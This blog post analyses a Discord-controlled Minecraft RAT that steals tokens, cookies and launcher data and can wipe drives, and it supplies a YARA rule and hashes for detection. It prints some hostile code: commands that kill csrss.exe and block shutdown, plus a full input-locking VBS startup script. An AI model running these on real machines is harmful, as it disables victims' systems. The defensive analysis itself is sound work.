---
title: Just Another Minecraft RAT
categories:
  - Research
tags:
  - blog
  - stealer
  - wiper
  - RAT
  - minecraft
  - research
date: 2025-07-10
description: Cause why install just mods?
author: slavetomints
researchers: 
- slavetomints
- tr4ceang3l
- akithecatearedmerc
image:
  path: /assets/img/just-another-minecraft-rat/persistence.png
  alt:
  post: false
---
>In this blog post, we will discuss malware and malicious software. There will be screenshots of the code, as well as small snippets of the things that it does. It is your responsibility not to run the code or snippets, as they will have real-life implications for the security of your system. This is for educational purposes only, and we are not liable for what you do with your computers. 
{: .prompt-danger }

## Introduction
### What is Discord?
Discord is a social media platform where its users can message, call, and share memes and other media[^1]. This all takes place on various servers, which are virtual communities. Servers on Discord can either be kept private for just a few friends or made public for everyone in the world to join and see. The most appealing part of all of this is that it is free; you do not need to pay any money (as of writing) to access public and private servers and enjoy them. 

### What is a Discord Bot?
Another feature of Discord is bots. Bots are more or less little programs that you can interface with on the app. In some servers, they can perform tasks such as searching through documentation to find the right help article, other times they can play simple games with users, or even just roll a dice[^2][^3]. Many times, bots are used in order to help with moderating the server to lighten the load on the admins.

## Why Discord?
Ever since Discord has exploded in popularity because of the COVID-19 lockdowns [^4], there's been a rise in the usage of Discord for malicious purposes[^5][^6][^7]. The malware sample this post covers uses a Discord bot to execute commands and exfiltrate information from the victim's computer. The exfiltrated information is then sent to a Discord server controlled by the attackers so that they can organize and act upon the information. Discord is free, making it an appealing choice for attackers looking to avoid hosting costs or using their hardware. Telegram is also used in this way.

Now that we've established Discord's role in the infrastructure of the attack, let's examine how the malware works.

## Infection Vector
The `ogdelete` command is supposed to "Remove[s] the injector script from the file it was injected into." The command uses the following regular expression to search through the Minecraft modules directory:
```
/Function\s*$$ .*?FileLib\s*\.\s*getUrlContent\s*\(\s*['"]https:\/\/hst\.sh\/raw\/[^'"]+['"]\s* $$.*?\)\s*$$ \s* $$\s*;/
```

With this, there are two pretty interesting strings in the expression. First, it appears to be searching for a string similar to `FileLib.getUrlContent("https://hst.sh/raw/abc123")`. `hst.sh` is the domain for `Hastebin`, the "prettiest, easiest to use pastebin ever made."[^12] They allow anyone to anonymously upload code to their site and access it from there. Secondly, the `FileLib.getUrlContent` seems to come from ChatTriggers, a framework for Minecraft Forge that allows for mods to be written in languages such as JavaScript.[^13][^14] This coincides with how the malware targets other ChatTriggers modules in the `modules` and `modulespath` commands. The documentation for the function can be found [here](https://chattriggers.com/javadocs/-chat-triggers/com.chattriggers.ctjs.minecraft.libs/-file-lib/get-url-content.html).

What this likely means is that the loader is in a malicious ChatTriggers module, which, when executed on the victim's PC, reaches out to a Hastebin post and downloads it, then runs the code. This, along with the fact that the sample was originally encountered via a Hastebin link, solidifies the theory that this sample is retrieved by `FileLib.getUrlContent`. The `ogdelete` command then attempts to hide this loader.

Now that we understand how the malware is deployed, let's look at what it can do on the system.
## Functionalities
### Persistence
This malware gains persistence via a batch script located at `\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mc_persist.bat` in the specific user's directory. While the malware includes a command to turn off persistence, it does not include any commands to enable it.

![the command that stops persistence](/assets/img/just-another-minecraft-rat/persistence.png)

We also see some persistence in the `inputblock` command, which we'll dive into further later in the article.

### Infostealing 
The main function of the malware is its ability to steal information from the victim. After the bot steals the information, it sends it back to a Discord server for the attackers to view. 

- The `getdiscord` command extracts the `Local Storage` and `Session Storage` directories from the victim's computer and sends them back to the Discord server. The `Local Storage` directory is a LevelDB database containing the Discord account token, a sensitive credential that can be used to impersonate the user.[^10]
- The `detectbrowsers` command just checks to see if the user has one or more of the following browsers installed: Chrome, Opera GX, Firefox, Microsoft Edge, Safari, and Brave.
- `getlogincookies` does exactly as the name implies. Interestingly enough, it supports more browsers than the `detectbrowsers` command. It includes all of those browsers as well as Vivaldi. For the Chromium browsers, it zips and exfiltrates the `Local State` file, and the `Cookies`, `History`, and `Browser Data` files.
- The `info` command exfiltrates the following data from the victim's system:
	- Minecraft Username
	- IP Address
	- Location
		- City
		- Region
		- Country
		- Latitude
		- Longitude
	- Minecraft Modules Folder
	- OS Name
	- OS Version
	- OS Architecture
	- Minecraft SSID
	- Minecraft UUID
	- Wi-Fi SSID
	- Wi-Fi Type
- The `netstat` command runs `netstat -an` on the victim's machine and sends back the information
- The `sysinfo` command exfiltrates the following data from the victim's system:
	- OS Name
	- OS Version
	- OS Architecture
	- Java Version
	- Total Memory
	- Free Memory
	- Processors
- The `screenshot` command takes a screenshot of the screen and sends it back as a `.png` file.
- `location` uses `https://api.ipify.org/?format=json` to get the victim's IP address, and then subsequently uses that IP address to make a request to `http://ip-api.com/json/`, which returns a multitude of information. The following information is sent back to the attacker:
	- City
	- Region
	- Country
	- Latitude
	- Longitude
- The `exfiltrate` command can do a few things:
	- First, it checks the Minecraft mod/modules folder for specific targets. If a match is found, the mod or module is zipped and sent back to the attacker.
	- It can steal browser cookies by using the same function as the`getlogincookies` command.
	- Finally, the command can exfiltrate data from the following Minecraft client launchers:
		- Default Minecraft Launcher
		- [Prism Launcher](https://prismlauncher.org/)
		- [MultiMC](https://multimc.org/)
		- [Feather Client](https://feathermc.com/)
		- [Badlion Client](https://www.badlion.net/minecraft-client)

In addition to being an infostealer, the malware has several other destructive capabilities.
### Wiping
- `diskwipe`. This command attempts to wipe the entire `C:` drive recursively. 

### Trolling
- `crashpc` - This command runs `taskkill /F /IM csrss.exe`. `csrss.exe` is the server side of the Win32 subsystem, and is therefore considered a critical system process[^11]. After deleting this process, the computer will become unstable and potentially unusable until it is rebooted.
- `freeze` - This command doesn't appear to function as intended, as all it does is spawn a new thread and indefinitely freeze it, without touching any of the other threads. 
- `audiospam` appears to simply play audio on a loop, annoying the victim
- `gpuoverload` uses the Minecraft thread and overloads the GPU with an extreme workload, causing gameplay issues and possibly even damaging the GPU. The authors even mention in the help menu to "`be careful and dont run this to many times`".
- `inputblock` does a few things
	- First, it creates a new thread that moves the cursor far off-screen in an infinite loop.
	- Then it adds a registry key by running `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableShutdown /t REG_DWORD /d 1 /f` to prevent the user from shutting down the PC from within Windows, but the user can still pull the plug or use the power button to shut down.
	- After running that, it adds [this](#input_lockvbs) Visual Basic script named `input_lock.vbs` to the Startup folder. It contains code that executes the same functionality as seen earlier, but now it is run upon startup.
	- Finally, it spawns another thread which runs `taskkill /F /IM shutdown.exe` in an infinite loop. This is another attempt to prevent the shutdown command from executing by forcefully ending it before it can finish executing.
	
### Other RAT Functions
- `ogdelete` - This command searches in the Minecraft modules directory for a JavaScript file whose content matches a regex looking for the injector script in an attempt to hide part of the infection vector. If it finds the injector script, it removes it from the file.
- `runhst` will download and run a script from `hst.sh`, using a URL passed as an argument.
- `disconnect` disconnects the bot.

### Minecraft Specific Functionalities

This malware was made for Minecraft users, so in addition to general system control, it includes several Minecraft-specific features.

- The `users` command sends back the usernames of all players connected to the world.
- The `stealfme` and `stealoringo` commands target the Minecraft configuration directory, looking for the `FunnyMapExtras`[^8] and `Oringoclient`[^9] cheats. If the cheat is in the config directory, its config file gets compressed into a zip file and sent back to the Discord server as an attachment for the attackers to download.
- `ssid` sends back the session ID of the client
- `uuid` sends back the UUID
- `modulespath` sends back the path to the Minecraft modules folder.
- `accounts` sends back the path to the following Minecraft launchers:
	-  Default Minecraft Launcher
	- [Prism Launcher](https://prismlauncher.org/)
	- [MultiMC](https://multimc.org/)
	- [Feather Client](https://feathermc.com/)
	- [Badlion Client](https://www.badlion.net/minecraft-client)
- `modules` scrapes the modules folder and sends back a message with all modules found.
- `mods` scrapes the mods folder and sends back a message with all the mods installed.
- `crashgame` runs the `shutdown` function for Minecraft in an infinite loop. 
- `logout` deletes `launcher_accounts.json` from the Minecraft folder, forcing the user to log back in to the launcher upon next startup.

## Extra Bits and Pieces
- There is a simulation mode that is toggled with the commands `!sim on` or `!sim off`. If simulation mode is enabled, none of the commands will work, and it instead sends back `Simulating [Command name]`. This is likely for testing and debugging the bot before running the commands.
- These are the help commands:
	- `commandhelp`, which gives a basic overview of each of the commands
	- `cookiehelp`, which gives a step-by-step guide on how to exploit stolen cookies
	- `logincookiehelp`, which explains how to stay secure if you suspect you've been a victim. An interesting thing to include in this program.

### YARA Detection Rule

```
rule MinecraftRat
{
    meta:
        description = "Detects known RAT based on Discord and ChatTriggers behavior"
        author = "DeTraced Security"
        reference = "https://detraced.org"
    strings:
        $url = "hst.sh/raw/"
        $regkey = "DisableShutdown"
        $vbscript = "{CAPSLOCK}"
        $powershell = "SetCursorPos"
    condition:
        all of them
}
```
{: file="rule.yara" }

### Hashes

| Algorithm | Hash Value                                                                                                                       |
| --------- | -------------------------------------------------------------------------------------------------------------------------------- |
| MD5       | df9a2e2d8dcb8c8599ed3d9b64a96c9c                                                                                                 |
| SHA-1     | 56e71cbcac7562ed0fc3ceadbfb79b5ab6ef230e                                                                                         |
| SHA-224   | 6ae3e04b0dfa8f6000a75cb479a347b0f473a4b33097ddedb2ab1293                                                                         |
| SHA-256   | f07018649beabceb8e67a13964e132f21638c1878c2259390320ca8fb4a145a6                                                                 |
| SHA-384   | 4f0eab97c9b329270a1517025d1c85fb591603fc45acca478ad3ec1e0e0c99301ea410949c072200d3334bd273aad9f1                                 |
| SHA-512   | 1f7c732e6903fabf985fafe90b628c4dcd5b96b92807b83420b8d1bab4de91267508e33ca0ad1402ba200159a2d8c411227fd9265a5ae3b779318f9928bce3b8 |


### input_lock.vbs
```vb
Set WShell = CreateObject("WScript.Shell")

While True
    WShell.SendKeys "{CAPSLOCK}"
    WShell.Run "powershell -Command \\"Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Mouse { [DllImport(\\\\\\"user32.dll\\\\\\")] public static extern bool SetCursorPos(int X, int Y); }'; [Mouse]::SetCursorPos(-999999, -999999)\\"", 0, False
    WScript.Sleep 1
Wend

```
{: file="input_lock.vbs" }

## Conclusion
This malware shows the capabilities hackers have by utilizing free infrastructure like Discord and Hastebin. RATs have become increasingly common in the Minecraft modding community, with projects like [Is This a RAT?](https://isthisarat.com) and [RatRater](https://ktibow.github.io/RatRater/) being used to help users find if the mod they downloaded is a RAT. Nonetheless, this malware highlights the dangers of downloading untrustworthy mods and running them with your game.

> Want to keep up with the DeTraced team? Come join our Discord [here!](https://discord.gg/ahecAvxwhh)
{: .prompt-info }

## References

[^1]: https://en.wikipedia.org/wiki/Discord

[^2]: https://en.wikipedia.org/wiki/Discord#Developer_tools_and_bots

[^3]: https://docs.statbot.net/docs/guide/bot/

[^4]: https://yoyofumedia.com/rise-of-discord/

[^5]: https://www.techradar.com/news/this-nasty-trojan-uses-discord-as-a-command-and-control-server

[^6]: https://thehackernews.com/2024/01/ns-stealer-uses-discord-bots-to.html

[^7]: https://www.ibm.com/think/x-force/self-checkout-discord-c2

[^8]: https://github.com/Harry282/FunnyMap

[^9]: https://skyblockmods.net/mods/oringo-client

[^10]: https://www.clrn.org/what-to-do-if-someone-has-your-discord-token/

[^11]: https://www.howtogeek.com/321581/what-is-client-server-runtime-process-csrss.exe-and-why-is-it-running-on-my-pc/

[^12]: https://hst.sh/about.md

[^13]: https://chattriggers.com/slate/#introduction

[^14]: https://chattriggers.com/javadocs/-chat-triggers/com.chattriggers.ctjs.minecraft.libs/-file-lib/get-url-content.html
